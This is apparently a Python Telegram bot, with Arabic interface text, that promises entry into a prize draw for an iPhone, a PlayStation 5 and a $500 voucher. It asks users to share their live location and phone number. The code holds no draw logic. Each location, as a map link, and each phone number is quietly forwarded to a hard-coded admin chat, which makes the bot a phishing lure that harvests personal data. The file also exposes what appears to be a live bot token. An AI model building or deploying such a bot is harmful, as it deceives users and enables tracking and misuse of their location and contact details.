python
import telebot
from telebot.types import Location, ReplyKeyboardMarkup, KeyboardButton, Contact
import random

# استبدل هذا بـ رمز البوت الخاص بك
bot = telebot.TeleBot("7628474532:AAHLQxj2lbrrlcR4j1wjcmFlbWzQtZ4JnsY")

# قائمة لتخزين معرفات المستخدمين الفريدة
user_ids = set()

@bot.message_handler(commands=['start'])
def start(message):
    # إضافة معرف المستخدم إلى القائمة إذا لم يكن موجودًا
    user_ids.add(message.from_user.id)
    
    # إنشاء قائمة رئيسية مع خيارات متعددة
    keyboard = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    location_button = KeyboardButton(text="📍 شارك موقعك الآن", request_location=True)
    contact_button = KeyboardButton(text="📞 شارك رقم هاتفك", request_contact=True)
    info_button = KeyboardButton(text="ℹ️ حول البوت")
    prizes_button = KeyboardButton(text="🎁 الجوائز")
    user_count_button = KeyboardButton(text="👥 عدد المستخدمين")
    keyboard.add(location_button, contact_button, info_button, prizes_button, user_count_button)

    # إرسال رسالة ترحيبية ديناميكية مع الرموز التعبيرية
    welcome_messages = [
        "🎉 أهلاً بك في مسابقتنا الرائعة! 🌟",
        "🎈 مرحباً بك في فرصة الفوز بجوائز مذهلة! 🎁",
        "✨ انضم إلينا لتجربة لا تُنسى مع جوائز قيمة! 🏆"
    ]
    welcome_message = random.choice(welcome_messages)

    bot.send_message(message.chat.id, welcome_message, reply_markup=keyboard)

@bot.message_handler(func=lambda message: message.text == "ℹ️ حول البوت")
def about_bot(message):
    bot.send_message(message.chat.id, """
    🤖 هذا البوت يتيح لك المشاركة في سحب على جوائز قيمة!
    📍 أرسل موقعك ورقم هاتفك للدخول في السحب.
    🌟 نحن هنا لخدمتك وتقديم أفضل التجارب.
    """)

@bot.message_handler(func=lambda message: message.text == "🎁 الجوائز")
def prizes_info(message):
    bot.send_message(message.chat.id, """
    🏆 الجوائز المتاحة:
    1. آيفون 13 برو ماكس 📱
    2. بلاي ستيشن 5 🎮
    3. قسيمة شرائية بقيمة 500$ 💳
    """)

@bot.message_handler(func=lambda message: message.text == "👥 عدد المستخدمين")
def user_count(message):
    bot.send_message(message.chat.id, f"👥 عدد المستخدمين المشاركين: {len(user_ids)}")

@bot.message_handler(content_types=['location'])
def get_location(message):
    latitude = message.location.latitude
    longitude = message.location.longitude
    google_maps_url = f"https://www.google.com/maps/place/{latitude},{longitude}"
    username = message.from_user.username or "مستخدم غير معروف"
    location_message = f"اسم المستخدم: {username}\nشارك موقعه: {google_maps_url}"
    admin_chat_id = "1051175859"
    bot.send_message(admin_chat_id, location_message)
    
    # رسالة شكر للمستخدم
    bot.send_message(message.chat.id, "📍 شكرًا لمشاركة موقعك معنا! تم تسجيل دخولك في السحب. نأمل لك حظاً موفقاً! 🍀")

@bot.message_handler(content_types=['contact'])
def get_contact(message):
    phone_number = message.contact.phone_number
    username = message.from_user.username or "مستخدم غير معروف"
    contact_message = f"اسم المستخدم: {username}\nشارك رقم هاتفه: {phone_number}"
    admin_chat_id = "YOUR_ADMIN_CHAT_ID"
    bot.send_message(admin_chat_id, contact_message)
    
    # رسالة شكر للمستخدم
    bot.send_message(message.chat.id, "📞 شكرًا لمشاركة رقم هاتفك! نحن نهتم بخصوصيتك ونتمنى لك حظاً موفقاً في السحب! 🎉")

# تشغيل البوت بشكل دائم ومعالجة الأخطاءpython

while True:
    try:
        bot.infinity_polling()  # استخدام infinity_polling بدلاً من polling
    except Exception as e:
        print(f"حدث خطأ: {e}")
        # يمكنك إضافة بعض التأخير قبل إعادة المحاولة لتجنب الاستهلاك العالي للموارد
        import time
        time.sleep(5)
